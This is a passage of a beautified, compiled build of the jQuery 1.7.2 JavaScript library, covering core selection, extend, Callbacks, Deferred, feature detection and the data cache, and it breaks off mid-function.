(function(t, m) {
    function T(a) {
        return c.isWindow(a) ? a : 9 === a.nodeType ? a.defaultView || a.parentWindow : !1
    }

    function ua(a) {
        if (!ga[a]) {
            var b = n.body,
                e = c("<" + a + ">").appendTo(b),
                d = e.css("display");
            e.remove();
            if ("none" === d || "" === d) I || (I = n.createElement("iframe"), I.frameBorder = I.width = I.height = 0), b.appendChild(I), L && I.createElement || (L = (I.contentWindow || I.contentDocument).document, L.write((c.support.boxModel ? "<!doctype html>" : "") + "<html><body>"), L.close()), e = L.createElement(a), L.body.appendChild(e), d = c.css(e, "display"),
                b.removeChild(I);
            ga[a] = d
        }
        return ga[a]
    }

    function Q(a, b) {
        var e = {};
        c.each(Y.concat.apply([], Y.slice(0, b)), function() {
            e[this] = a
        });
        return e
    }

    function lb() {
        Z = m
    }

    function va() {
        setTimeout(lb, 0);
        return Z = c.now()
    }

    function wa() {
        try {
            return new t.XMLHttpRequest
        } catch (a) {}
    }

    function ha(a, b, e, d) {
        if (c.isArray(b)) c.each(b, function(b, c) {
            e || mb.test(a) ? d(a, c) : ha(a + "[" + ("object" == typeof c ? b : "") + "]", c, e, d)
        });
        else if (e || "object" !== c.type(b)) d(a, b);
        else
            for (var f in b) ha(a + "[" + f + "]", b[f], e, d)
    }

    function xa(a, b) {
        var e, d, f = c.ajaxSettings.flatOptions || {};
        for (e in b) b[e] !== m && ((f[e] ? a : d || (d = {}))[e] = b[e]);
        d && c.extend(!0, a, d)
    }

    function aa(a, b, c, d, f, g) {
        f = f || b.dataTypes[0];
        g = g || {};
        g[f] = !0;
        f = a[f];
        for (var k = 0, h = f ? f.length : 0, l = a === ia, p; k < h && (l || !p); k++) p = f[k](b, c, d), "string" == typeof p && (!l || g[p] ? p = m : (b.dataTypes.unshift(p), p = aa(a, b, c, d, p, g)));
        !l && p || g["*"] || (p = aa(a, b, c, d, "*", g));
        return p
    }

    function ya(a) {
        return function(b, e) {
            "string" != typeof b && (e = b, b = "*");
            if (c.isFunction(e))
                for (var d = b.toLowerCase().split(za), f = 0, g = d.length, k, h; f < g; f++) k = d[f], (h = /^\+/.test(k)) &&
                    (k = k.substr(1) || "*"), k = a[k] = a[k] || [], k[h ? "unshift" : "push"](e)
        }
    }

    function Aa(a, b, e) {
        var d = "width" === b ? a.offsetWidth : a.offsetHeight,
            f = "width" === b ? 1 : 0;
        if (0 < d) {
            if ("border" !== e)
                for (; 4 > f; f += 2) e || (d -= parseFloat(c.css(a, "padding" + M[f])) || 0), "margin" === e ? d += parseFloat(c.css(a, e + M[f])) || 0 : d -= parseFloat(c.css(a, "border" + M[f] + "Width")) || 0;
            return d + "px"
        }
        d = N(a, b);
        if (0 > d || null == d) d = a.style[b];
        if (ja.test(d)) return d;
        d = parseFloat(d) || 0;
        if (e)
            for (; 4 > f; f += 2) d += parseFloat(c.css(a, "padding" + M[f])) || 0, "padding" !== e && (d +=
                parseFloat(c.css(a, "border" + M[f] + "Width")) || 0), "margin" === e && (d += parseFloat(c.css(a, e + M[f])) || 0);
        return d + "px"
    }

    function Ba(a) {
        var b = (a.nodeName || "").toLowerCase();
        "input" === b ? Ca(a) : "script" !== b && "undefined" != typeof a.getElementsByTagName && c.grep(a.getElementsByTagName("input"), Ca)
    }

    function Ca(a) {
        if ("checkbox" === a.type || "radio" === a.type) a.defaultChecked = a.checked
    }

    function ba(a) {
        return "undefined" != typeof a.getElementsByTagName ? a.getElementsByTagName("*") : "undefined" != typeof a.querySelectorAll ? a.querySelectorAll("*") : []
    }

    function Da(a, b) {
        var e;
        1 === b.nodeType && (b.clearAttributes && b.clearAttributes(), b.mergeAttributes && b.mergeAttributes(a), e = b.nodeName.toLowerCase(), "object" === e ? b.outerHTML = a.outerHTML : "input" !== e || "checkbox" !== a.type && "radio" !== a.type ? "option" === e ? b.selected = a.defaultSelected : "input" === e || "textarea" === e ? b.defaultValue = a.defaultValue : "script" === e && b.text !== a.text && (b.text = a.text) : (a.checked && (b.defaultChecked = b.checked = a.checked), b.value !== a.value && (b.value = a.value)), b.removeAttribute(c.expando),
            b.removeAttribute("_submit_attached"), b.removeAttribute("_change_attached"))
    }

    function Ea(a, b) {
        if (1 === b.nodeType && c.hasData(a)) {
            var e, d, f;
            d = c._data(a);
            var g = c._data(b, d),
                k = d.events;
            if (k)
                for (e in delete g.handle, g.events = {}, k)
                    for (d = 0, f = k[e].length; d < f; d++) c.event.add(b, e, k[e][d]);
            g.data && (g.data = c.extend({}, g.data))
        }
    }

    function nb(a, b) {
        return c.nodeName(a, "table") ? a.getElementsByTagName("tbody")[0] || a.appendChild(a.ownerDocument.createElement("tbody")) : a
    }

    function Fa(a) {
        var b = Ga.split("|");
        a = a.createDocumentFragment();
        if (a.createElement)
            for (; b.length;) a.createElement(b.pop());
        return a
    }

    function Ha(a, b, e) {
        b = b || 0;
        if (c.isFunction(b)) return c.grep(a, function(a, c) {
            return !!b.call(a, c, a) === e
        });
        if (b.nodeType) return c.grep(a, function(a, c) {
            return a === b === e
        });
        if ("string" == typeof b) {
            var d = c.grep(a, function(a) {
                return 1 === a.nodeType
            });
            if (ob.test(b)) return c.filter(b, d, !e);
            b = c.filter(b, d)
        }
        return c.grep(a, function(a, d) {
            return 0 <= c.inArray(a, b) === e
        })
    }

    function Ia(a) {
        return !a || !a.parentNode || 11 === a.parentNode.nodeType
    }

    function ca() {
        return !0
    }

    function J() {
        return !1
    }

    function Ja(a, b, e) {
        var d = b + "defer",
            f = b + "queue",
            g = b + "mark",
            k = c._data(a, d);
        !k || "queue" !== e && c._data(a, f) || "mark" !== e && c._data(a, g) || setTimeout(function() {
            c._data(a, f) || c._data(a, g) || (c.removeData(a, d, !0), k.fire())
        }, 0)
    }

    function ka(a) {
        for (var b in a)
            if (("data" !== b || !c.isEmptyObject(a[b])) && "toJSON" !== b) return !1;
        return !0
    }

    function Ka(a, b, e) {
        if (e === m && 1 === a.nodeType)
            if (e = "data-" + b.replace(pb, "-$1").toLowerCase(), e = a.getAttribute(e), "string" == typeof e) {
                try {
                    e = "true" === e ? !0 : "false" ===
                        e ? !1 : "null" === e ? null : c.isNumeric(e) ? +e : qb.test(e) ? c.parseJSON(e) : e
                } catch (d) {}
                c.data(a, b, e)
            } else e = m;
        return e
    }

    function rb(a) {
        var b = La[a] = {},
            c, d;
        a = a.split(/\s+/);
        c = 0;
        for (d = a.length; c < d; c++) b[a[c]] = !0;
        return b
    }
    var n = t.document,
        sb = t.navigator,
        tb = t.location,
        c = function() {
            function a() {
                if (!b.isReady) {
                    try {
                        n.documentElement.doScroll("left")
                    } catch (c) {
                        setTimeout(a, 1);
                        return
                    }
                    b.ready()
                }
            }
            var b = function(a, c) {
                    return new b.fn.init(a, c, f)
                },
                c = t.jQuery,
                d = t.$,
                f, g = /^(?:[^#<]*(<[\w\W]+>)[^>]*$|#([\w\-]*)$)/,
                k = /\S/,
                h = /^\s+/,
                l = /\s+$/,
                p = /^<(\w+)\s*\/?>(?:<\/\1>)?$/,
                y = /^[\],:{}\s]*$/,
                q = /\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,
                V = /"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,
                r = /(?:^|:|,)(?:\s*\[)+/g,
                B = /(webkit)[ \/]([\w.]+)/,
                A = /(opera)(?:.*version)?[ \/]([\w.]+)/,
                u = /(msie) ([\w.]+)/,
                x = /(mozilla)(?:.*? rv:([\w.]+))?/,
                C = /-([a-z]|[0-9])/ig,
                H = /^-ms-/,
                v = function(a, b) {
                    return (b + "").toUpperCase()
                },
                D = sb.userAgent,
                z, E, ub = Object.prototype.toString,
                la = Object.prototype.hasOwnProperty,
                ma = Array.prototype.push,
                X = Array.prototype.slice,
                Ma = String.prototype.trim,
                Na = Array.prototype.indexOf,
                Oa = {};
            b.fn = b.prototype = {
                constructor: b,
                init: function(a, c, e) {
                    var d, f;
                    if (!a) return this;
                    if (a.nodeType) return this.context = this[0] = a, this.length = 1, this;
                    if ("body" === a && !c && n.body) return this.context = n, this[0] = n.body, this.selector = a, this.length = 1, this;
                    if ("string" == typeof a) {
                        "<" !== a.charAt(0) || ">" !== a.charAt(a.length - 1) || 3 > a.length ? d = g.exec(a) : d = [null, a, null];
                        if (d && (d[1] || !c)) {
                            if (d[1]) return f = (c = c instanceof b ? c[0] : c) ? c.ownerDocument || c : n, (e = p.exec(a)) ?
                                b.isPlainObject(c) ? (a = [n.createElement(e[1])], b.fn.attr.call(a, c, !0)) : a = [f.createElement(e[1])] : (e = b.buildFragment([d[1]], [f]), a = (e.cacheable ? b.clone(e.fragment) : e.fragment).childNodes), b.merge(this, a);
                            if ((c = n.getElementById(d[2])) && c.parentNode) {
                                if (c.id !== d[2]) return e.find(a);
                                this.length = 1;
                                this[0] = c
                            }
                            this.context = n;
                            this.selector = a;
                            return this
                        }
                        return !c || c.jquery ? (c || e).find(a) : this.constructor(c).find(a)
                    }
                    if (b.isFunction(a)) return e.ready(a);
                    a.selector !== m && (this.selector = a.selector, this.context = a.context);
                    return b.makeArray(a, this)
                },
                selector: "",
                jquery: "1.7.2",
                length: 0,
                size: function() {
                    return this.length
                },
                toArray: function() {
                    return X.call(this, 0)
                },
                get: function(a) {
                    return null == a ? this.toArray() : 0 > a ? this[this.length + a] : this[a]
                },
                pushStack: function(a, c, e) {
                    var d = this.constructor();
                    b.isArray(a) ? ma.apply(d, a) : b.merge(d, a);
                    d.prevObject = this;
                    d.context = this.context;
                    "find" === c ? d.selector = this.selector + (this.selector ? " " : "") + e : c && (d.selector = this.selector + "." + c + "(" + e + ")");
                    return d
                },
                each: function(a, c) {
                    return b.each(this,
                        a, c)
                },
                ready: function(a) {
                    b.bindReady();
                    z.add(a);
                    return this
                },
                eq: function(a) {
                    a = +a;
                    return -1 === a ? this.slice(a) : this.slice(a, a + 1)
                },
                first: function() {
                    return this.eq(0)
                },
                last: function() {
                    return this.eq(-1)
                },
                slice: function() {
                    return this.pushStack(X.apply(this, arguments), "slice", X.call(arguments).join(","))
                },
                map: function(a) {
                    return this.pushStack(b.map(this, function(b, c) {
                        return a.call(b, c, b)
                    }))
                },
                end: function() {
                    return this.prevObject || this.constructor(null)
                },
                push: ma,
                sort: [].sort,
                splice: [].splice
            };
            b.fn.init.prototype =
                b.fn;
            b.extend = b.fn.extend = function() {
                var a, c, e, d, f, z, g = arguments[0] || {},
                    k = 1,
                    h = arguments.length,
                    E = !1;
                "boolean" == typeof g && (E = g, g = arguments[1] || {}, k = 2);
                "object" != typeof g && !b.isFunction(g) && (g = {});
                for (h === k && (g = this, --k); k < h; k++)
                    if (null != (a = arguments[k]))
                        for (c in a) e = g[c], d = a[c], g !== d && (E && d && (b.isPlainObject(d) || (f = b.isArray(d))) ? (f ? (f = !1, z = e && b.isArray(e) ? e : []) : z = e && b.isPlainObject(e) ? e : {}, g[c] = b.extend(E, z, d)) : d !== m && (g[c] = d));
                return g
            };
            b.extend({
                noConflict: function(a) {
                    t.$ === b && (t.$ = d);
                    a && t.jQuery ===
                        b && (t.jQuery = c);
                    return b
                },
                isReady: !1,
                readyWait: 1,
                holdReady: function(a) {
                    a ? b.readyWait++ : b.ready(!0)
                },
                ready: function(a) {
                    if (!0 === a && !--b.readyWait || !0 !== a && !b.isReady) {
                        if (!n.body) return setTimeout(b.ready, 1);
                        b.isReady = !0;
                        !0 !== a && 0 < --b.readyWait || (z.fireWith(n, [b]), b.fn.trigger && b(n).trigger("ready").off("ready"))
                    }
                },
                bindReady: function() {
                    if (!z) {
                        z = b.Callbacks("once memory");
                        if ("complete" === n.readyState) return setTimeout(b.ready, 1);
                        if (n.addEventListener) n.addEventListener("DOMContentLoaded", E, !1), t.addEventListener("load",
                            b.ready, !1);
                        else if (n.attachEvent) {
                            n.attachEvent("onreadystatechange", E);
                            t.attachEvent("onload", b.ready);
                            var c = !1;
                            try {
                                c = null == t.frameElement
                            } catch (e) {}
                            n.documentElement.doScroll && c && a()
                        }
                    }
                },
                isFunction: function(a) {
                    return "function" === b.type(a)
                },
                isArray: Array.isArray || function(a) {
                    return "array" === b.type(a)
                },
                isWindow: function(a) {
                    return null != a && a == a.window
                },
                isNumeric: function(a) {
                    return !isNaN(parseFloat(a)) && isFinite(a)
                },
                type: function(a) {
                    return null == a ? String(a) : Oa[ub.call(a)] || "object"
                },
                isPlainObject: function(a) {
                    if (!a ||
                        "object" !== b.type(a) || a.nodeType || b.isWindow(a)) return !1;
                    try {
                        if (a.constructor && !la.call(a, "constructor") && !la.call(a.constructor.prototype, "isPrototypeOf")) return !1
                    } catch (c) {
                        return !1
                    }
                    for (var e in a);
                    return e === m || la.call(a, e)
                },
                isEmptyObject: function(a) {
                    for (var b in a) return !1;
                    return !0
                },
                error: function(a) {
                    throw Error(a);
                },
                parseJSON: function(a) {
                    if ("string" != typeof a || !a) return null;
                    a = b.trim(a);
                    if (t.JSON && t.JSON.parse) return t.JSON.parse(a);
                    if (y.test(a.replace(q, "@").replace(V, "]").replace(r, ""))) return (new Function("return " +
                        a))();
                    b.error("Invalid JSON: " + a)
                },
                parseXML: function(a) {
                    if ("string" != typeof a || !a) return null;
                    var c, e;
                    try {
                        t.DOMParser ? (e = new DOMParser, c = e.parseFromString(a, "text/xml")) : (c = new ActiveXObject("Microsoft.XMLDOM"), c.async = "false", c.loadXML(a))
                    } catch (d) {
                        c = m
                    }
                    c && c.documentElement && !c.getElementsByTagName("parsererror").length || b.error("Invalid XML: " + a);
                    return c
                },
                noop: function() {},
                globalEval: function(a) {
                    a && k.test(a) && (t.execScript || function(a) {
                        t.eval.call(t, a)
                    })(a)
                },
                camelCase: function(a) {
                    return a.replace(H,
                        "ms-").replace(C, v)
                },
                nodeName: function(a, b) {
                    return a.nodeName && a.nodeName.toUpperCase() === b.toUpperCase()
                },
                each: function(a, c, e) {
                    var d, f = 0,
                        z = a.length,
                        g = z === m || b.isFunction(a);
                    if (e)
                        if (g)
                            for (d in a) {
                                if (!1 === c.apply(a[d], e)) break
                            } else
                                for (; f < z && !1 !== c.apply(a[f++], e););
                        else if (g)
                        for (d in a) {
                            if (!1 === c.call(a[d], d, a[d])) break
                        } else
                            for (; f < z && !1 !== c.call(a[f], f, a[f++]););
                    return a
                },
                trim: Ma ? function(a) {
                    return null == a ? "" : Ma.call(a)
                } : function(a) {
                    return null == a ? "" : (a + "").replace(h, "").replace(l, "")
                },
                makeArray: function(a,
                    c) {
                    var e = c || [];
                    if (null != a) {
                        var d = b.type(a);
                        null == a.length || "string" === d || "function" === d || "regexp" === d || b.isWindow(a) ? ma.call(e, a) : b.merge(e, a)
                    }
                    return e
                },
                inArray: function(a, b, c) {
                    var e;
                    if (b) {
                        if (Na) return Na.call(b, a, c);
                        e = b.length;
                        for (c = c ? 0 > c ? Math.max(0, e + c) : c : 0; c < e; c++)
                            if (c in b && b[c] === a) return c
                    }
                    return -1
                },
                merge: function(a, b) {
                    var c = a.length,
                        e = 0;
                    if ("number" == typeof b.length)
                        for (var d = b.length; e < d; e++) a[c++] = b[e];
                    else
                        for (; b[e] !== m;) a[c++] = b[e++];
                    a.length = c;
                    return a
                },
                grep: function(a, b, c) {
                    var e = [],
                        d;
                    c = !!c;
                    for (var f = 0, z = a.length; f < z; f++) d = !!b(a[f], f), c !== d && e.push(a[f]);
                    return e
                },
                map: function(a, c, e) {
                    var d, f, z = [],
                        g = 0,
                        k = a.length;
                    if (a instanceof b || k !== m && "number" == typeof k && (0 < k && a[0] && a[k - 1] || 0 === k || b.isArray(a)))
                        for (; g < k; g++) d = c(a[g], g, e), null != d && (z[z.length] = d);
                    else
                        for (f in a) d = c(a[f], f, e), null != d && (z[z.length] = d);
                    return z.concat.apply([], z)
                },
                guid: 1,
                proxy: function(a, c) {
                    if ("string" == typeof c) {
                        var e = a[c];
                        c = a;
                        a = e
                    }
                    if (!b.isFunction(a)) return m;
                    var d = X.call(arguments, 2),
                        e = function() {
                            return a.apply(c,
                                d.concat(X.call(arguments)))
                        };
                    e.guid = a.guid = a.guid || e.guid || b.guid++;
                    return e
                },
                access: function(a, c, e, d, f, z, g) {
                    var k, h = null == e,
                        E = 0,
                        l = a.length;
                    if (e && "object" == typeof e) {
                        for (E in e) b.access(a, c, E, e[E], 1, z, d);
                        f = 1
                    } else if (d !== m) {
                        k = g === m && b.isFunction(d);
                        h && (k ? (k = c, c = function(a, c, e) {
                            return k.call(b(a), e)
                        }) : (c.call(a, d), c = null));
                        if (c)
                            for (; E < l; E++) c(a[E], e, k ? d.call(a[E], E, c(a[E], e)) : d, g);
                        f = 1
                    }
                    return f ? a : h ? c.call(a) : l ? c(a[0], e) : z
                },
                now: function() {
                    return (new Date).getTime()
                },
                uaMatch: function(a) {
                    a = a.toLowerCase();
                    a = B.exec(a) || A.exec(a) || u.exec(a) || 0 > a.indexOf("compatible") && x.exec(a) || [];
                    return {
                        browser: a[1] || "",
                        version: a[2] || "0"
                    }
                },
                sub: function() {
                    function a(b, c) {
                        return new a.fn.init(b, c)
                    }
                    b.extend(!0, a, this);
                    a.superclass = this;
                    a.fn = a.prototype = this();
                    a.fn.constructor = a;
                    a.sub = this.sub;
                    a.fn.init = function(e, d) {
                        d && d instanceof b && !(d instanceof a) && (d = a(d));
                        return b.fn.init.call(this, e, d, c)
                    };
                    a.fn.init.prototype = a.fn;
                    var c = a(n);
                    return a
                },
                browser: {}
            });
            b.each("Boolean Number String Function Array Date RegExp Object".split(" "),
                function(a, b) {
                    Oa["[object " + b + "]"] = b.toLowerCase()
                });
            D = b.uaMatch(D);
            D.browser && (b.browser[D.browser] = !0, b.browser.version = D.version);
            b.browser.webkit && (b.browser.safari = !0);
            k.test("\u00a0") && (h = /^[\s\xA0]+/, l = /[\s\xA0]+$/);
            f = b(n);
            n.addEventListener ? E = function() {
                n.removeEventListener("DOMContentLoaded", E, !1);
                b.ready()
            } : n.attachEvent && (E = function() {
                "complete" === n.readyState && (n.detachEvent("onreadystatechange", E), b.ready())
            });
            return b
        }(),
        La = {};
    c.Callbacks = function(a) {
        a = a ? La[a] || rb(a) : {};
        var b = [],
            e = [],
            d, f, g, k, h, l, p = function(e) {
                var d, f, g, k;
                d = 0;
                for (f = e.length; d < f; d++) g = e[d], k = c.type(g), "array" === k ? p(g) : "function" !== k || a.unique && q.has(g) || b.push(g)
            },
            y = function(c, p) {
                p = p || [];
                d = !a.memory || [c, p];
                g = f = !0;
                l = k || 0;
                k = 0;
                for (h = b.length; b && l < h; l++)
                    if (!1 === b[l].apply(c, p) && a.stopOnFalse) {
                        d = !0;
                        break
                    }
                g = !1;
                b && (a.once ? !0 === d ? q.disable() : b = [] : e && e.length && (d = e.shift(), q.fireWith(d[0], d[1])))
            },
            q = {
                add: function() {
                    if (b) {
                        var a = b.length;
                        p(arguments);
                        g ? h = b.length : d && !0 !== d && (k = a, y(d[0], d[1]))
                    }
                    return this
                },
                remove: function() {
                    if (b)
                        for (var c =
                                arguments, e = 0, d = c.length; e < d; e++)
                            for (var f = 0; f < b.length && (c[e] !== b[f] || (g && f <= h && (h--, f <= l && l--), b.splice(f--, 1), !a.unique)); f++);
                    return this
                },
                has: function(a) {
                    if (b)
                        for (var c = 0, e = b.length; c < e; c++)
                            if (a === b[c]) return !0;
                    return !1
                },
                empty: function() {
                    b = [];
                    return this
                },
                disable: function() {
                    b = e = d = m;
                    return this
                },
                disabled: function() {
                    return !b
                },
                lock: function() {
                    e = m;
                    d && !0 !== d || q.disable();
                    return this
                },
                locked: function() {
                    return !e
                },
                fireWith: function(b, c) {
                    e && (g ? a.once || e.push([b, c]) : (!a.once || !d) && y(b, c));
                    return this
                },
                fire: function() {
                    q.fireWith(this, arguments);
                    return this
                },
                fired: function() {
                    return !!f
                }
            };
        return q
    };
    var na = [].slice;
    c.extend({
        Deferred: function(a) {
            var b = c.Callbacks("once memory"),
                e = c.Callbacks("once memory"),
                d = c.Callbacks("memory"),
                f = "pending",
                g = {
                    resolve: b,
                    reject: e,
                    notify: d
                },
                k = {
                    done: b.add,
                    fail: e.add,
                    progress: d.add,
                    state: function() {
                        return f
                    },
                    isResolved: b.fired,
                    isRejected: e.fired,
                    then: function(a, b, c) {
                        h.done(a).fail(b).progress(c);
                        return this
                    },
                    always: function() {
                        h.done.apply(h, arguments).fail.apply(h, arguments);
                        return this
                    },
                    pipe: function(a, b, e) {
                        return c.Deferred(function(d) {
                            c.each({
                                done: [a, "resolve"],
                                fail: [b, "reject"],
                                progress: [e, "notify"]
                            }, function(a, b) {
                                var e = b[0],
                                    f = b[1],
                                    g;
                                c.isFunction(e) ? h[a](function() {
                                    (g = e.apply(this, arguments)) && c.isFunction(g.promise) ? g.promise().then(d.resolve, d.reject, d.notify) : d[f + "With"](this === h ? d : this, [g])
                                }) : h[a](d[f])
                            })
                        }).promise()
                    },
                    promise: function(a) {
                        if (null == a) a = k;
                        else
                            for (var b in k) a[b] = k[b];
                        return a
                    }
                },
                h = k.promise({}),
                l;
            for (l in g) h[l] = g[l].fire, h[l + "With"] = g[l].fireWith;
            h.done(function() {
                f = "resolved"
            }, e.disable, d.lock).fail(function() {
                f = "rejected"
            }, b.disable, d.lock);
            a && a.call(h, h);
            return h
        },
        when: function(a) {
            function b(a) {
                return function(b) {
                    k[a] = 1 < arguments.length ? na.call(arguments, 0) : b;
                    l.notifyWith(p, k)
                }
            }

            function e(a) {
                return function(b) {
                    d[a] = 1 < arguments.length ? na.call(arguments, 0) : b;
                    --h || l.resolveWith(l, d)
                }
            }
            var d = na.call(arguments, 0),
                f = 0,
                g = d.length,
                k = Array(g),
                h = g,
                l = 1 >= g && a && c.isFunction(a.promise) ? a : c.Deferred(),
                p = l.promise();
            if (1 < g) {
                for (; f < g; f++) d[f] && d[f].promise &&
                    c.isFunction(d[f].promise) ? d[f].promise().then(e(f), l.reject, b(f)) : --h;
                h || l.resolveWith(l, d)
            } else l !== a && l.resolveWith(l, g ? [a] : []);
            return p
        }
    });
    c.support = function() {
        var a, b, e, d, f, g, k, h, l = n.createElement("div");
        l.setAttribute("className", "t");
        l.innerHTML = "   <link/><table></table><a href='/a' style='top:1px;float:left;opacity:.55;'>a</a><input type='checkbox'/>";
        b = l.getElementsByTagName("*");
        e = l.getElementsByTagName("a")[0];
        if (!b || !b.length || !e) return {};
        d = n.createElement("select");
        f = d.appendChild(n.createElement("option"));
        b = l.getElementsByTagName("input")[0];
        a = {
            leadingWhitespace: 3 === l.firstChild.nodeType,
            tbody: !l.getElementsByTagName("tbody").length,
            htmlSerialize: !!l.getElementsByTagName("link").length,
            style: /top/.test(e.getAttribute("style")),
            hrefNormalized: "/a" === e.getAttribute("href"),
            opacity: /^0.55/.test(e.style.opacity),
            cssFloat: !!e.style.cssFloat,
            checkOn: "on" === b.value,
            optSelected: f.selected,
            getSetAttribute: "t" !== l.className,
            enctype: !!n.createElement("form").enctype,
            html5Clone: "<:nav></:nav>" !== n.createElement("nav").cloneNode(!0).outerHTML,
            submitBubbles: !0,
            changeBubbles: !0,
            focusinBubbles: !1,
            deleteExpando: !0,
            noCloneEvent: !0,
            inlineBlockNeedsLayout: !1,
            shrinkWrapBlocks: !1,
            reliableMarginRight: !0,
            pixelMargin: !0
        };
        c.boxModel = a.boxModel = "CSS1Compat" === n.compatMode;
        b.checked = !0;
        a.noCloneChecked = b.cloneNode(!0).checked;
        d.disabled = !0;
        a.optDisabled = !f.disabled;
        try {
            delete l.test
        } catch (p) {
            a.deleteExpando = !1
        }!l.addEventListener && l.attachEvent && l.fireEvent && (l.attachEvent("onclick", function() {
            a.noCloneEvent = !1
        }), l.cloneNode(!0).fireEvent("onclick"));
        b = n.createElement("input");
        b.value = "t";
        b.setAttribute("type", "radio");
        a.radioValue = "t" === b.value;
        b.setAttribute("checked", "checked");
        b.setAttribute("name", "t");
        l.appendChild(b);
        e = n.createDocumentFragment();
        e.appendChild(l.lastChild);
        a.checkClone = e.cloneNode(!0).cloneNode(!0).lastChild.checked;
        a.appendChecked = b.checked;
        e.removeChild(b);
        e.appendChild(l);
        if (l.attachEvent)
            for (k in {
                    submit: 1,
                    change: 1,
                    focusin: 1
                }) b = "on" + k, (h = b in l) || (l.setAttribute(b, "return;"), h = "function" == typeof l[b]), a[k + "Bubbles"] =
                h;
        e.removeChild(l);
        e = d = f = l = b = null;
        c(function() {
            var b, e, d, f, k, p, m = n.getElementsByTagName("body")[0];
            !m || (b = n.createElement("div"), b.style.cssText = "padding:0;margin:0;border:0;visibility:hidden;width:0;height:0;position:static;top:0;margin-top:1px", m.insertBefore(b, m.firstChild), l = n.createElement("div"), b.appendChild(l), l.innerHTML = "<table><tr><td style='padding:0;margin:0;border:0;display:none'></td><td>t</td></tr></table>", g = l.getElementsByTagName("td"), h = 0 === g[0].offsetHeight, g[0].style.display =
                "", g[1].style.display = "none", a.reliableHiddenOffsets = h && 0 === g[0].offsetHeight, t.getComputedStyle && (l.innerHTML = "", p = n.createElement("div"), p.style.width = "0", p.style.marginRight = "0", l.style.width = "2px", l.appendChild(p), a.reliableMarginRight = 0 === (parseInt((t.getComputedStyle(p, null) || {
                    marginRight: 0
                }).marginRight, 10) || 0)), "undefined" != typeof l.style.zoom && (l.innerHTML = "", l.style.width = l.style.padding = "1px", l.style.border = 0, l.style.overflow = "hidden", l.style.display = "inline", l.style.zoom = 1, a.inlineBlockNeedsLayout =
                    3 === l.offsetWidth, l.style.display = "block", l.style.overflow = "visible", l.innerHTML = "<div style='width:5px;'></div>", a.shrinkWrapBlocks = 3 !== l.offsetWidth), l.style.cssText = "position:absolute;top:0;left:0;width:1px;height:1px;padding:0;margin:0;border:0;visibility:hidden;", l.innerHTML = "<div style='position:absolute;top:0;left:0;width:1px;height:1px;padding:0;margin:0;border:5px solid #000;display:block;'><div style='padding:0;margin:0;border:0;display:block;overflow:hidden;'></div></div><table style='position:absolute;top:0;left:0;width:1px;height:1px;padding:0;margin:0;border:5px solid #000;' cellpadding='0' cellspacing='0'><tr><td></td></tr></table>",
                e = l.firstChild, d = e.firstChild, f = e.nextSibling.firstChild.firstChild, k = {
                    doesNotAddBorder: 5 !== d.offsetTop,
                    doesAddBorderForTableAndCells: 5 === f.offsetTop
                }, d.style.position = "fixed", d.style.top = "20px", k.fixedPosition = 20 === d.offsetTop || 15 === d.offsetTop, d.style.position = d.style.top = "", e.style.overflow = "hidden", e.style.position = "relative", k.subtractsBorderForOverflowNotVisible = -5 === d.offsetTop, k.doesNotIncludeMarginInBodyOffset = 1 !== m.offsetTop, t.getComputedStyle && (l.style.marginTop = "1%", a.pixelMargin = "1%" !==
                    (t.getComputedStyle(l, null) || {
                        marginTop: 0
                    }).marginTop), "undefined" != typeof b.style.zoom && (b.style.zoom = 1), m.removeChild(b), l = null, c.extend(a, k))
        });
        return a
    }();
    var qb = /^(?:\{.*\}|\[.*\])$/,
        pb = /([A-Z])/g;
    c.extend({
        cache: {},
        uuid: 0,
        expando: "jQuery" + (c.fn.jquery + Math.random()).replace(/\D/g, ""),
        noData: {
            embed: !0,
            object: "clsid:D27CDB6E-AE6D-11cf-96B8-444553540000",
            applet: !0
        },
        hasData: function(a) {
            a = a.nodeType ? c.cache[a[c.expando]] : a[c.expando];
            return !!a && !ka(a)
        },
        data: function(a, b, e, d) {
            if (c.acceptData(a)) {
                var f,
                    g;
                f = c.expando;
                var k = "string" == typeof b,
                    h = a.nodeType,
                    l = h ? c.cache : a,
                    p = h ? a[f] : a[f] && f,
                    y = "events" === b;
                if (p && l[p] && (y || d || l[p].data) || !k || e !== m) {
                    p || (h ? a[f] = p = ++c.uuid : p = f);
                    l[p] || (l[p] = {}, h || (l[p].toJSON = c.noop));
                    if ("object" == typeof b || "function" == typeof b) d ? l[p] = c.extend(l[p], b) : l[p].data = c.extend(l[p].data, b);
                    a = f = l[p];
                    d || (f.data || (f.data = {}), f = f.data);
                    e !== m && (f[c.camelCase(b)] = e);
                    if (y && !f[b]) return a.events;
                    k ? (g = f[b], null == g && (g = f[c.camelCase(b)])) : g = f;
                    return g
                }
            }
        },
        removeData: function(a, b, e) {
            if (c.acceptData(a)) {
                var d,
                    f, g, k = c.expando,
                    h = a.nodeType,
                    l = h ? c.cache : a,
                    p = h ? a[k] : k;
                if (l[p]) {
                    if (b && (d = e ? l[p] : l[p].data)) {
                        c.isArray(b) || (b in d ? b = [b] : (b = c.camelCase(b), b in d ? b = [b] : b = b.split(" ")));
                        f = 0;
                        for (g = b.length; f < g; f++) delete d[b[f]];
                        if (!(e ? ka : c.isEmptyObject)(d)) return
                    }
                    if (!e && (delete l[p].data, !ka(l[p]))) return;
                    c.support.deleteExpando || !l.setInterval ? delete l[p] : l[p] = null;
                    h && (c.support.deleteExpando ? delete a[k] : a.removeAttribute ? a.removeAttribute(k) : a[k] = null)
                }
            }
        },
        _data: function(a, b, e) {
            return c.data(a, b, e, !0)
        },
        acceptData: function(a) {
            if (a.nodeName) {
                var b =
                    c.noData[a.nodeName.toLowerCase()];
                if (b) return !0 !== b && a.getAttribute("classid") === b
            }
            return !0
        }
    });
    c.fn.extend({
        data: function(a, b) {
            var e, d, f, g, k, h = this[0],
                l = 0,
                p = null;
            if (a === m) {
                if (this.length && (p = c.data(h), 1 === h.nodeType && !c._data(h, "parsedAttrs"))) {
                    f = h.attributes;
                    for (k = f.length; l < k; l++) g = f[l].name, 0 === g.indexOf("data-") && (g = c.camelCase(g.substring(5)), Ka(h, g, p[g]));
                    c._data(h, "parsedAttrs", !0)
                }
                return p
            }
            if ("object" == typeof a) return this.each(function() {
                c.data(this, a)
            });
            e = a.split(".", 2);
            e[1] = e[1] ? "." + e[1] :
                "";
            d = e[1] + "!";
            return c.access(this, function(b) {
